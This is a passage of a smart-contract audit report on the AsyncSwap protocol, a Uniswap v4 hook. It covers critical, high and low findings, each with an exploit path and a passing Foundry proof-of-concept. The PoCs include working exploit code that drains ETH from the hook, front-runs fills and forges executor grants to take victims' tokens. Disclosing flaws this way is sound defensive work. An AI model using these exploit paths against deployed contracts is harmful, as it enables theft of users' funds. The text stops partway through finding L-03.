# AsyncSwap Protocol Audit Report

**Date**: 2026-05-08
**Target**: https://github.com/asyncswap/protocol
**Author**: Lee | 33 Labs

Overlapping findings are merged under the higher severity. Unique findings from each run are preserved.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 4 |
| Medium | 0 |
| Low | 3 |
| Informational | 1 |
| Unclear | 0 |

---

## Findings

### [C-01] `AsyncFiller` commingles native escrow in `address(hook).balance` — any self-owned native-output order drains every wei in the hook

**What's wrong**

The hook holds native ETH in a single shared pot. There is no per-order accounting that ties a specific amount of ETH in the hook to a specific order. When anyone fills a native-output order, the hook pays the maker out of that shared pot — regardless of who actually deposited the ETH or which order it was meant to fund. An attacker submits a self-owned, 1-wei-input order asking for the entire pot as output, fills it themselves, and walks away with whatever ETH was in the hook.

**How (mechanism)**

`AsyncFiller.fill` settles `amountOutMin` of native output to the maker via `output.settle(POOLMANAGER, address(hook), amountOutMin, false)` ([AsyncFiller.sol:116-117](AsyncFiller.sol#L116-L117)); for native currency `CurrencySettler` invokes `manager.settle{value: amountOutMin}()` from `address(hook)`, drawing directly from `address(hook).balance` ([AsyncSwap.sol:receive](AsyncSwap.sol)). No order field records how much native the hook is *owed*, and no per-order escrow is debited. The attacker creates a self-owned order with `order.owner = msg.sender = hookData.user = attacker`, `amountIn = 1` (ERC20), `amountOutMin = address(hook).balance` — `_createOrder` accepts it because `setExecutor[attacker][router] = true` is a legitimate self-grant ([AsyncSwap.sol:191](AsyncSwap.sol#L191)) — and then calls `Router.fillOrder` against their own order. `fill` settles the entire hook balance to the attacker (via `output.take` to `order.owner`) and burns the 1-wei ERC20 input claim ([AsyncFiller.sol:120-122](AsyncFiller.sol#L120-L122)). The bug is the absence of per-order native accounting; it is independent of how ETH enters the hook and of who owns the order being filled.

**Severity**: Critical  **Confidence**: High  **Class**: DeltaAccounting / TokenEdgeCases
**Location**: `AsyncFiller.sol:fill` / `AsyncSwap.sol:receive`

**Exploit Path**

1. Hook's balance is non-zero from any source — donation, prior overpaid fill, in-flight settle, future native-escrow path. Attacker reads `address(hook).balance = STRANDED`.
2. Attacker calls `Router.swap` with a self-owned order: `owner = attacker`, `zeroForOne = false` (ERC20-in, ETH-out), `amountIn = 1` wei ERC20, `amountOutMin = STRANDED`, `hookData.user = attacker`. `_createOrder` stores the order and writes `setExecutor[attacker][router] = true` — a legitimate self-grant.
3. Attacker calls `Router.fillOrder{value: 0}(order, "")`. Native-output branch skips `transferFrom` of output.
4. `AsyncFiller.fill` settles `STRANDED` ETH from `address(hook).balance` to the maker (the attacker) and burns the 1-wei input claim back to the attacker.
5. Net delta: attacker spends 0 ETH and 0 ERC20 (the 1-wei input is returned via `input.take`), receives `STRANDED` ETH.

**Expected Delta**: `+address(hook).balance` per extraction; bounded only by the hook's current native balance.

**PoC** — `[POC-PASS]` Run: `forge test --match-contract C01_CommingledEscrowTest -vvvv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncFiller} from "@async-swap/libraries/AsyncFiller.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";
import {Router} from "@async-swap/Router.sol";
import {MockERC20} from "../utils/MockERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/PoolManager.sol";
import {Currency, IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {PoolId} from "v4-core/types/PoolId.sol";
import {PoolIdLibrary, PoolKey} from "v4-core/types/PoolKey.sol";

contract C01_CommingledEscrowTest is Test {
    using PoolIdLibrary for PoolKey;

    address owner = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    IPoolManager manager;
    AsyncSwap hook;
    Router router;
    MockERC20 erc20;
    Currency currency0; // native
    Currency currency1; // ERC20
    PoolKey key;
    PoolId poolId;

    function setUp() public {
        manager = new PoolManager(owner);
        erc20 = new MockERC20("Test Token", "TST", 18);

        currency0 = Currency.wrap(address(0));
        currency1 = Currency.wrap(address(erc20));

        uint160 flags = uint160(
            Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG
                | Hooks.BEFORE_SWAP_RETURNS_DELTA_FLAG
        );
        deployCodeTo("AsyncSwap.sol", abi.encode(manager), address(flags));
        hook = AsyncSwap(payable(address(flags)));
        router = new Router(manager, hook);

        key = PoolKey({
            currency0: currency0, currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG, tickSpacing: int24(1), hooks: hook
        });
        poolId = key.toId();
        manager.initialize(key, 2 ** 96);

        vm.deal(attacker, 1 ether);
        erc20.mint(attacker, 1);
    }

    function _order(address ownerAddr, bool zeroForOne, uint256 amountIn, uint256 amountOutMin, uint64 nonce)
        internal view returns (AsyncOrder memory)
    {
        return AsyncOrder({
            key: key, owner: ownerAddr, zeroForOne: zeroForOne,
            amountIn: amountIn, amountOutMin: amountOutMin,
            sqrtPrice: 2 ** 96, nonce: nonce
        });
    }

    function test_exploit_C01_commingledEscrowDrain() public {
        // 1. Seed hook with ETH from ANY source (vm.deal stands in for
        //    donation, leftover, in-flight value — independent of H-02/H-03).
        uint256 STRANDED = 10 ether;
        vm.deal(address(hook), STRANDED);
        assertEq(address(hook).balance, STRANDED, "precondition: hook holds ETH");

        // 2. Self-owned 1-wei input, native-output order. Attacker is the user.
        AsyncOrder memory order = _order({
            ownerAddr: attacker, zeroForOne: false,
            amountIn: 1, amountOutMin: STRANDED, nonce: 0
        });

        vm.startPrank(attacker);
        erc20.approve(address(router), 1);
        router.swap(
            order,
            abi.encode(AsyncSwap.UserParams({
                user: attacker, executor: address(router), amountOutMin: STRANDED, nonce: 0
            }))
        );
        vm.stopPrank();

        // 3. Attacker fills their own order with msg.value=0; fill draws from
        //    address(hook).balance regardless.
        uint256 attackerEthBefore = attacker.balance;
        vm.prank(attacker);
        router.fillOrder{value: 0}(order, "");

        // 4. Attacker drained the pot for free.
        assertEq(attacker.balance - attackerEthBefore, STRANDED, "attacker received the entire pot");
        assertEq(address(hook).balance, 0, "hook drained to zero");
        assertEq(erc20.balanceOf(attacker), 1, "attacker got their 1-wei ERC20 back via input.take");
    }
}
```

**Recommendations**

Replace `address(hook).balance` as the native settlement source with per-order native escrow. Track ETH owed per order at creation (for native-output orders, debit on fill / refund on cancel). `fill` should settle from a per-order accounted amount, never from the shared hook balance. Reject any state where `sum(perOrderNativeEscrow) > address(hook).balance`.

---

### [H-01] Maker can front-run a pending fill with `updatePrice` and overcharge the filler

**What's wrong**

A filler who broadcasts `Router.fillOrder` can be charged any price the maker chooses. The maker watches the pending fill in the mempool, raises the order's stored output price, and the filler's transaction pays the new price out of whatever ERC20 allowance they granted to the router. The filler still receives only the original reserved input.

**How (mechanism)**

`Router.fillOrder` accepts no `maxPrice`, deadline, or signed price quote from the filler ([Router.sol:80](Router.sol#L80)). Inside `unlockCallback` Fill branch, `livePrice` is re-read from hook storage via `HOOK.asyncOrderInfo` ([Router.sol:153](Router.sol#L153)) and `transferFrom(filler, hook, livePrice)` pulls that amount from the filler ([Router.sol:158](Router.sol#L158)). `AsyncSwap.updatePrice` ([AsyncSwap.sol:143](AsyncSwap.sol#L143)) overwrites `info.amountOutMin` with no cooldown, no commit-reveal, and no filler opt-in — gated only by `caller == order.owner` ([AsyncFiller.sol:69-83](AsyncFiller.sol#L69-L83)). `AsyncFiller.fill` releases the unchanged stored `amountIn` to the filler and the new `amountOutMin` to the maker, so every same-block price increase transfers the increase from filler to maker.

**Severity**: High  **Confidence**: High  **Class**: MEVEconomic
**Location**: `Router.sol:fillOrder` / `Router.sol:unlockCallback`

**Exploit Path**

1. Maker creates order via `Router.swap`: `amountIn = 1000 USDC`, `amountOutMin = 1 WETH`.
2. Filler approves Router for unlimited WETH (standard practice for active fillers).
3. Filler submits `Router.fillOrder(order)` expecting to pay 1 WETH.
4. Maker observes the pending fill, front-runs with `AsyncSwap.updatePrice(order, 1000 WETH)` at higher gas.
5. Filler's tx executes: `livePrice = 1000 WETH`; `transferFrom(filler, hook, 1000 WETH)` succeeds against the unlimited approval.
6. `fill()` settles 1000 WETH to the maker and `amountIn = 1000 USDC` to the filler.
7. Filler paid 1000 WETH for 1000 USDC instead of the agreed 1 WETH.

**Expected Delta**: filler loses `(newPrice − originalPrice)` of output token; maker gains the same. Bounded by filler's wallet balance, not the order's intended price.

**PoC** — `[POC-PASS]` Run: `forge test --match-contract H01_MakerFrontrunTest -vv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {SetupHook} from "../SetupHook.t.sol";
import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";

contract H01_MakerFrontrunTest is SetupHook {
    address alice = makeAddr("alice"); // maker (attacker)
    address bob   = makeAddr("bob");   // filler (victim)

    function setUp() public override {
        super.setUp();
        topUp(alice, 100 ether);
        topUp(bob, 100 ether);
    }

    function _orderFromMaker(address maker, bool zeroForOne, uint256 amountIn, uint256 amountOutMin, uint64 nonce)
        internal view returns (AsyncOrder memory)
    {
        return AsyncOrder({
            key: key, owner: maker, zeroForOne: zeroForOne,
            amountIn: amountIn, amountOutMin: amountOutMin,
            sqrtPrice: 2 ** 96, nonce: nonce
        });
    }

    function test_exploit_makerFrontrunsFillerWithUpdatePrice() public {
        uint256 amountIn       = 1e18;
        uint256 originalOutMin = 0.8e18;
        uint256 frontrunOutMin = 1.1e18;

        AsyncOrder memory order = _orderFromMaker(alice, true, amountIn, originalOutMin, 0);

        vm.startPrank(alice);
        token0.approve(address(router), amountIn);
        router.swap(
            order,
            abi.encode(AsyncSwap.UserParams({
                user: alice, executor: address(router), amountOutMin: originalOutMin, nonce: 0
            }))
        );
        vm.stopPrank();

        vm.prank(bob);
        token1.approve(address(router), 2e18);

        // Maker front-runs the pending fill — no nonce, no deadline, no filler opt-in.
        vm.prank(alice);
        hook.updatePrice(order, frontrunOutMin);

        uint256 bobToken1Before   = token1.balanceOf(bob);
        uint256 bobToken0Before   = token0.balanceOf(bob);
        uint256 aliceToken1Before = token1.balanceOf(alice);

        vm.prank(bob);
        router.fillOrder(order, "");

        uint256 bobPaidToken1       = bobToken1Before - token1.balanceOf(bob);
        uint256 bobReceivedToken0   = token0.balanceOf(bob) - bobToken0Before;
        uint256 aliceReceivedToken1 = token1.balanceOf(alice) - aliceToken1Before;

        assertEq(bobPaidToken1,       frontrunOutMin, "filler paid live (frontrun) price");
        assertEq(bobReceivedToken0,   amountIn,       "filler got only the unchanged amountIn");
        assertEq(aliceReceivedToken1, frontrunOutMin, "maker pocketed the bumped output");
        assertEq(bobPaidToken1 - originalOutMin, 0.3e18, "extracted delta is 0.3 token1");
    }
}
```

---

### [H-02] Forged `hookData` writes `setExecutor[victim][attacker] = true`, granting permanent executor rights over the victim's existing orders

**What's wrong**

Any address that enters a PoolManager unlock can call `PM.swap` with crafted `hookData` to create an order attributed to an arbitrary victim and simultaneously register itself as an authorized executor for that victim. The grant covers every order the victim has ever submitted in that pool, not just the forged one — the attacker can then execute the victim's real orders and capture the spread between current market and the victim's stored limit price.

**How (mechanism)**

`AsyncSwap._beforeSwap` decodes `hookParams` into `UserParams` ([AsyncSwap.sol:166](AsyncSwap.sol#L166)) and `_createOrder` writes `state.setExecutor[hookData.user][hookData.executor] = true` ([AsyncSwap.sol:191](AsyncSwap.sol#L191)) without checking that `hookData.user` is the actual swap originator. Inside `_beforeSwap`, `msg.sender` is the PoolManager, so the hook cannot identify who initiated the outer `PM.swap`. An attacker who opens a `PM.unlock` context calls `poolManager.swap(key, params, abi.encode(UserParams{user: victim, executor: attacker, amountOutMin: 1, nonce: unusedNonce}))` directly. `setExecutor` is keyed flat `(owner, executor)`, and neither `fill` nor `cancel` clears it ([AsyncFiller.sol:111](AsyncFiller.sol#L111), [AsyncFiller.sol:137](AsyncFiller.sol#L137)). `executeOrder` carries no `onlyRouter`/`onlyPoolManager` guard ([AsyncSwap.sol:125-129](AsyncSwap.sol#L125-L129)); `fill` checks only `setExecutor[order.owner][executor]` ([AsyncFiller.sol:102](AsyncFiller.sol#L102)) and the filler address is attacker-supplied, so `input.take(filler, amountIn)` sends the victim's locked tokens to the attacker ([AsyncFiller.sol:121](AsyncFiller.sol#L121)).

**Severity**: High  **Confidence**: High  **Class**: AccessControl / HookData
**Location**: `AsyncSwap.sol:_createOrder` / `AsyncSwap.sol:executeOrder` / `AsyncSwap.sol:cancelOrder`

**Exploit Path**

1. Attacker contract enters `PM.unlock`. Inside callback, calls `poolManager.swap(victimPoolKey, SwapParams{zeroForOne, -1 wei, sqrtPriceLimit}, abi.encode(UserParams{user: victim, executor: attacker, amountOutMin: 1, nonce: freshNonce}))`.
2. Hook `_beforeSwap` runs (authorized by PM), writes `setExecutor[victim][attacker] = true`, and takes 1 wei of input as 6909.
3. Attacker settles 1 wei to PM and exits the unlock.
4. Attacker opens a second `PM.unlock`, transfers `amountOutMin` of output to the hook, and calls `AsyncSwap.executeOrder(victimExistingOrder, abi.encode(attacker))` directly.
5. `AsyncFiller.fill` sees the (forged) executor grant, burns the hook's 6909 input claim, and sends `amountIn` of victim's input to the attacker. Victim receives only `amountOutMin` of output.
6. Attacker pockets the spread whenever the market price of the input exceeds the victim's stored `amountOutMin`.

**Expected Delta**: `+amountIn` of input token (victim's collateral) `−amountOutMin` of output token; net positive when market rate exceeds the stored limit.

**PoC** — `[POC-PASS]`. Demonstrates the spread-extraction path: attacker forges `setExecutor[victim][attacker]` via crafted hookData and immediately drains the victim's pre-existing order in the same unlock.
Run: `forge test --match-contract H02_ExecutorForgeryTest -vv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {SetupHook} from "../SetupHook.t.sol";
import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/interfaces/callback/IUnlockCallback.sol";
import {Currency, CurrencyLibrary} from "v4-core/types/Currency.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {CurrencySettler} from "@uniswap/v4-core/test/utils/CurrencySettler.sol";
import {IERC20Minimal} from "v4-core/interfaces/external/IERC20Minimal.sol";

contract Attacker is IUnlockCallback {
    using CurrencySettler for Currency;
    IPoolManager public immutable manager;
    AsyncSwap public immutable hook;
    address public victim; PoolKey public poolKey; AsyncOrder public victimOrder; uint64 public forgedNonce;

    constructor(IPoolManager _manager, AsyncSwap _hook) { manager = _manager; hook = _hook; }

    function attack(address _victim, PoolKey calldata _key, AsyncOrder calldata _victimOrder, uint64 _forgedNonce) external {
        victim = _victim; poolKey = _key; victimOrder = _victimOrder; forgedNonce = _forgedNonce;
        manager.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(manager), "only PM");
        bool zeroForOne = victimOrder.zeroForOne;
        IPoolManager.SwapParams memory sp = IPoolManager.SwapParams({
            zeroForOne: zeroForOne, amountSpecified: -1,
            sqrtPriceLimitX96: zeroForOne ? uint160(4295128740) : uint160(1461446703485210103287273052203988822378723970341)
        });
        manager.swap(poolKey, sp, abi.encode(AsyncSwap.UserParams({
            user: victim, executor: address(this), amountOutMin: 1, nonce: forgedNonce
        })));
        Currency input = zeroForOne ? poolKey.currency0 : poolKey.currency1;
        input.settle(manager, address(this), 1, false);

        Currency output = victimOrder.zeroForOne ? poolKey.currency1 : poolKey.currency0;
        IERC20Minimal(Currency.unwrap(output)).transfer(address(hook), victimOrder.amountOutMin);
        hook.executeOrder(victimOrder, abi.encode(address(this)));
        return "";
    }
}

contract H02_ExecutorForgeryTest is SetupHook {
    address victim = makeAddr("victim");
    function setUp() public override { super.setUp(); topUp(victim, 100 ether); }

    function test_exploit_H02_forgedExecutorGrant() public {
        uint256 amountIn = 5 ether; uint256 amountOutMin = 4.5 ether;
        AsyncOrder memory victimOrder = AsyncOrder({
            key: key, owner: victim, zeroForOne: true,
            amountIn: amountIn, amountOutMin: amountOutMin, sqrtPrice: 2 ** 96, nonce: 0
        });

        vm.startPrank(victim);
        token0.approve(address(router), amountIn);
        router.swap(victimOrder, abi.encode(AsyncSwap.UserParams({
            user: victim, executor: address(router), amountOutMin: amountOutMin, nonce: 0
        })));
        vm.stopPrank();

        Attacker attacker = new Attacker(manager, hook);
        topUp(address(attacker), amountOutMin + 1);

        assertFalse(hook.isExecutor(poolId, victim, address(attacker)), "attacker NOT yet authorised");
        uint256 attackerToken0Before = token0.balanceOf(address(attacker));
        uint256 attackerToken1Before = token1.balanceOf(address(attacker));

        attacker.attack(victim, key, victimOrder, /* forgedNonce */ 99);

        assertTrue(hook.isExecutor(poolId, victim, address(attacker)), "attacker forged executor grant");
        assertEq(token0.balanceOf(address(attacker)) - attackerToken0Before, amountIn - 1, "attacker took victim's amountIn");
        assertEq(attackerToken1Before - token1.balanceOf(address(attacker)), amountOutMin, "attacker paid only stored amountOutMin");
    }
}
```

---

### [H-03] Stranded ETH in Router/`AsyncSwap` is extractable via a `msg.value = 0` native order plus cancel

**What's wrong**

The Router accepts arbitrary ETH on both order submission and order fill, then later pays native-token settlements from the contract's own balance. Excess ETH from one user remains pooled in the Router or hook, and a later caller can submit a native-input order with `msg.value = 0` (or fill a self-owned native-output order) to extract it.

**How (mechanism)**

`Router.swap` is payable but never checks `msg.value == order.amountIn` for native input or `msg.value == 0` for ERC20 input before entering `POOLMANAGER.unlock` ([Router.sol:64-73](Router.sol#L64-L73)). The Swap branch later calls `input.settle(POOLMANAGER, user, orderData.order.amountIn, false)` ([Router.sol:142-143](Router.sol#L142-L143)); for native currency, `CurrencySettler.settle` invokes `manager.settle{value: amount}()` from `address(this)` and ignores the `payer` argument. Whenever `Router.balance >= amountIn`, the new order settles from previously stranded ETH. `Router.fillOrder` has the symmetric gap on the output side ([Router.sol:80-96](Router.sol#L80-L96)): it forwards `msg.value` to `AsyncSwap`, and `AsyncFiller.fill` settles only `amountOutMin` from the hook ([AsyncFiller.sol:116-117](AsyncFiller.sol#L116-L117)), leaving the excess pooled for a future native-output fill to consume. `AsyncFiller.cancel` then burns the hook's claim and `take`s real input ETH from PM to `order.owner` ([AsyncFiller.sol:141-142](AsyncFiller.sol#L141-L142), [AsyncFiller.sol:128-145](AsyncFiller.sol#L128-L145)) — the attacker's own address, since they own the forged order.

**Severity**: High  **Confidence**: High  **Class**: TokenEdgeCases / DeltaAccounting
**Location**: `Router.sol:swap` / `Router.sol:unlockCallback` / `CurrencySettler` native branch

**Exploit Path**

1. Maker1 calls `Router.swap{value: 2 ether}` for an `order.amountIn = 1 ether` native-input order. Router settles 1 ETH to PM; 1 ETH remains in `Router.balance`.
2. Attacker (Maker2) calls `Router.swap{value: 0}` with `order2.amountIn = 1 ether`, fresh nonce, native currency0.
3. `unlockCallback` Swap branch: `PM.swap` → `_beforeSwap` takes 1 ETH as 6909 from PM. PM debt: Router owes 1 ETH.
4. `input.settle(POOLMANAGER, Maker2, 1 ether, false)` invokes `manager.settle{value: 1 ether}()`, draining Maker1's ETH from `Router.balance`. Debt cleared.
5. Order is stored in hook keyed to attacker; `setExecutor[Maker2][Router] = true`.
6. Attacker calls `Router.cancelOrder(order2)`. Cancel branch invokes `HOOK.cancelOrder` → `AsyncFiller.cancel` burns the hook's 6909 and `take`s 1 real ETH from PM to attacker.
7. Net: attacker sent 0 ETH, received 1 ETH. The symmetric path drains ETH stranded in `AsyncSwap` via a native-output fill.

**Expected Delta**: `+stranded native ETH` held by Router or `AsyncSwap`, per extraction.

**PoC** — `[POC-PASS]`. Run: `forge test --match-contract H03_StrandedEthTest -vvvv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";
import {Router} from "@async-swap/Router.sol";
import {MockERC20} from "../utils/MockERC20.sol";
import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/PoolManager.sol";
import {Currency, IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {PoolId} from "v4-core/types/PoolId.sol";
import {PoolIdLibrary, PoolKey} from "v4-core/types/PoolKey.sol";

contract H03_StrandedEthTest is Test {
    using PoolIdLibrary for PoolKey;

    address owner = makeAddr("deployer");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    IPoolManager manager;
    AsyncSwap hook;
    Router router;
    MockERC20 erc20;
    Currency currency0; // native (address(0))
    Currency currency1; // erc20
    PoolKey key;
    PoolId poolId;

    function setUp() public {
        manager = new PoolManager(owner);
        erc20 = new MockERC20("Test Token", "TST", 18);

        currency0 = Currency.wrap(address(0));
        currency1 = Currency.wrap(address(erc20));

        uint160 flags = uint160(
            Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG
                | Hooks.BEFORE_SWAP_RETURNS_DELTA_FLAG
        );
        deployCodeTo("AsyncSwap.sol", abi.encode(manager), address(flags));
        hook = AsyncSwap(payable(address(flags)));
        router = new Router(manager, hook);

        key = PoolKey({
            currency0: currency0, currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG, tickSpacing: int24(1), hooks: hook
        });
        poolId = key.toId();
        manager.initialize(key, 2 ** 96);

        vm.deal(victim, 100 ether);
        vm.deal(attacker, 0); // attacker MUST start with no ETH
    }

    function _order(address maker, bool zeroForOne, uint256 amountIn, uint256 amountOutMin, uint64 nonce)
        internal view returns (AsyncOrder memory)
    {
        return AsyncOrder({
            key: key, owner: maker, zeroForOne: zeroForOne,
            amountIn: amountIn, amountOutMin: amountOutMin,
            sqrtPrice: 2 ** 96, nonce: nonce
        });
    }

    function test_exploit_strandedEth_swept_via_async_order_cancel() public {
        // 1. Victim overpays a 1 ETH native-input order with 5 ETH; 4 ETH stranded.
        AsyncOrder memory victimOrder = _order(victim, true, 1 ether, 0.95 ether, 0);
        vm.startPrank(victim);
        router.swap{value: 5 ether}(
            victimOrder,
            abi.encode(AsyncSwap.UserParams({
                user: victim, executor: address(router), amountOutMin: 0.95 ether, nonce: 0
            }))
        );
        vm.stopPrank();

        uint256 stranded = address(router).balance;
        assertEq(stranded, 4 ether, "4 ETH stranded in Router");
        assertEq(attacker.balance, 0, "attacker has no ETH yet");

        // 2. Attacker submits native-input order with msg.value == 0; settle pays from Router.balance.
        AsyncOrder memory atkOrder = _order(attacker, true, stranded, 1 wei, 7);
        vm.startPrank(attacker);
        router.swap{value: 0}(
            atkOrder,
            abi.encode(AsyncSwap.UserParams({
                user: attacker, executor: address(router), amountOutMin: 1 wei, nonce: 7
            }))
        );

        // 3. Cancel returns the native input to order.owner == attacker.
        router.cancelOrder(atkOrder);
        vm.stopPrank();

        assertEq(attacker.balance, 4 ether, "attacker swept the full stranded amount");
        assertEq(address(router).balance, 0, "router has been drained");
    }
}
```

---

### [H-04] NatSpec on `Router.swap` says `amountOutMin`/`nonce` come from `userData`; code reads them from `order` — makers following the docs lose their input

**What's wrong**

The NatSpec on `Router.swap` tells callers that `amountOutMin` and `nonce` are read from `userData`, not from the `order` struct. The code does the opposite. A maker who follows the documented API — putting their real limit price in `userData.amountOutMin` and a placeholder in `order.amountOutMin` — has the order created at the placeholder price. Any filler can then drain the maker's full input for 1 wei of output.

**How (mechanism)**

`Router.swap` decodes `userData` ([Router.sol:66](Router.sol#L66)) but uses only `userParams.executor` to enforce `require(userParams.executor == address(this))` ([Router.sol:67](Router.sol#L67)). Inside `unlockCallback`, the Router builds the `UserParams` forwarded to `PM.swap` from `orderData.order.amountOutMin` and `orderData.order.nonce` ([Router.sol:129-136](Router.sol#L129-L136)) — the order-struct fields, not `userData`. The NatSpec at [Router.sol:55-63](Router.sol#L55-L63) explicitly states `"The maker's amountOutMin and nonce are read from userData, NOT order"`, directly contradicting the live code. `AsyncSwap._createOrder` stores `hookData.amountOutMin` as the order's limit price ([AsyncSwap.sol:196](AsyncSwap.sol#L196)); `ZeroAmount` rejects only `0` ([AsyncSwap.sol:194](AsyncSwap.sol#L194)), so a placeholder of `1` passes. `AsyncFiller.fill` then settles exactly `amountOutMin = 1 wei` to the maker and pays the filler the full `amountIn` ([AsyncFiller.sol:116-117](AsyncFiller.sol#L116-L117), [AsyncFiller.sol:121](AsyncFiller.sol#L121)).

**Severity**: High  **Confidence**: High  **Class**: HookData
**Location**: `Router.sol:swap` / `Router.sol:unlockCallback`

**Exploit Path**

1. Maker reads the NatSpec and encodes `userData = UserParams{user: maker, executor: router, amountOutMin: 1000e18, nonce: 1}` while passing `order.amountOutMin = 1` as a placeholder.
2. Router passes the executor check using `userData.executor`.
3. `unlockCallback` constructs the forwarded `UserParams` from `order.amountOutMin = 1` and `order.nonce = 1`, silently discarding `userData.amountOutMin` and `userData.nonce`.
4. `_createOrder` stores the order with `amountOutMin = 1`.
5. Any filler calls `Router.fillOrder` and pays 1 wei of output, receiving the maker's full `amountIn`.

**Expected Delta**: maker loses `amountIn − 1 wei`; filler gains the same at zero net cost.

**PoC** — `[POC-PASS]`  Run: `forge test --match-contract H04_NatspecMismatchTest -vvvv`. 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {SetupHook} from "../SetupHook.t.sol";
import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";

contract H04_NatspecMismatchTest is SetupHook {
    address alice = makeAddr("alice"); // maker (follows NatSpec)
    address bob = makeAddr("bob");     // any filler

    function setUp() public override {
        super.setUp();
        topUp(alice, 100 ether);
        topUp(bob, 100 ether);
    }

    function _orderId(address maker, bool zeroForOne, uint64 nonce) internal view returns (bytes32) {
        return keccak256(abi.encode(poolId, maker, zeroForOne, nonce));
    }

    function test_exploit_H04_userDataAmountOutMinIgnored() public {
        uint256 amountIn = 1 ether;
        uint256 placeholder = 1;          // 1 wei in `order` — NatSpec says it's not read
        uint256 realLimit = 1000 ether;   // real limit in userData per NatSpec

        AsyncOrder memory order = AsyncOrder({
            key: key, owner: alice, zeroForOne: true,
            amountIn: amountIn, amountOutMin: placeholder,
            sqrtPrice: 2 ** 96, nonce: 0
        });

        vm.startPrank(alice);
        token0.approve(address(router), amountIn);
        router.swap(order, abi.encode(AsyncSwap.UserParams({
            user: alice, executor: address(router),
            amountOutMin: realLimit, nonce: 0
        })));
        vm.stopPrank();

        // Hook stored the placeholder, not the real limit — userData.amountOutMin discarded.
        bytes32 id = _orderId(alice, true, 0);
        (, uint256 storedOutMin) = hook.asyncOrderInfo(poolId, id);
        assertEq(storedOutMin, placeholder, "BUG: stored amountOutMin is 1-wei placeholder");
        assertTrue(storedOutMin != realLimit, "BUG: real limit from userData was dropped");

        uint256 aliceToken1Before = token1.balanceOf(alice);
        uint256 bobToken0Before = token0.balanceOf(bob);

        vm.startPrank(bob);
        token1.approve(address(router), placeholder);
        router.fillOrder(order, "");
        vm.stopPrank();

        assertEq(token1.balanceOf(alice) - aliceToken1Before, 1, "maker received 1 wei output");
        assertEq(token0.balanceOf(bob) - bobToken0Before, amountIn, "filler took maker's full input");
    }
}
```

---

### [L-01] `setExecutor` mapping has no revoke path

**What's wrong**

`AsyncFiller.State.setExecutor` is written to `true` in `_createOrder` ([AsyncSwap.sol:191](AsyncSwap.sol#L191)) and never reset anywhere in the codebase. A maker who wants to rotate or revoke an executor — including the Router itself — has no on-chain mechanism. `cancel` deletes only the order, not the grant ([AsyncFiller.sol:128-145](AsyncFiller.sol#L128-L145)).

**Severity**: Low  **Confidence**: High  **Class**: AccessControl
**Location**: `AsyncFiller.sol:State.setExecutor` / `AsyncSwap.sol:_createOrder`

UX gap on its own: legitimate grants flow only from the maker's own `Router.swap` calls (executor is forced to the Router at [Router.sol:67](Router.sol#L67)). Pending orders can always be cancelled. Cap stays at Low.

---

### [L-02] `Router.swap` does not enforce `order.owner == msg.sender`; mismatched owner field locks the input

**What's wrong**

If a maker passes `order.owner != msg.sender`, the Router still pulls the input but stores the order under `msg.sender`'s key. Every recovery path looks up `order.owner` instead, so the maker cannot cancel, fill, or update the order — the input is locked in the hook's 6909 balance.

**How (mechanism)**

`Router.swap` does not validate `order.owner == msg.sender` ([Router.sol:64-73](Router.sol#L64-L73)). The Router writes `tstore(USER_LOCATION, caller())`, and `unlockCallback` builds `UserParams.user = caller`. `_createOrder` derives the storage key from `keccak256(poolId, hookData.user, zeroForOne, hookData.nonce)` ([AsyncSwap.sol:193](AsyncSwap.sol#L193)) — the caller, not `order.owner`. Every downstream operation computes `id = order.orderId() = keccak256(poolId, order.owner, zeroForOne, nonce)` ([AsyncOrder.sol:40-42](AsyncOrder.sol#L40-L42)) and `cancelOrder` enforces `msg.sender == order.owner` ([Router.sol:100](Router.sol#L100)), so the lookup misses the stored slot.

**Severity**: Low  **Confidence**: High  **Class**: DeltaAccounting
**Location**: `Router.sol:swap`

User-input-validation class; damages only the user themselves.


---

### [L-03] Native-ETH overpayment to `Router.swap` is not refunded (standalone)

**What's wrong**

`Router.swap` is payable but does not validate `msg.value == order.amountIn`. ETH above `amountIn` stays in the Router; the contract has no `sweep`, `refund`, or `recoverETH` function. Standalone, this is a user-error class.

**How (mechanism)**

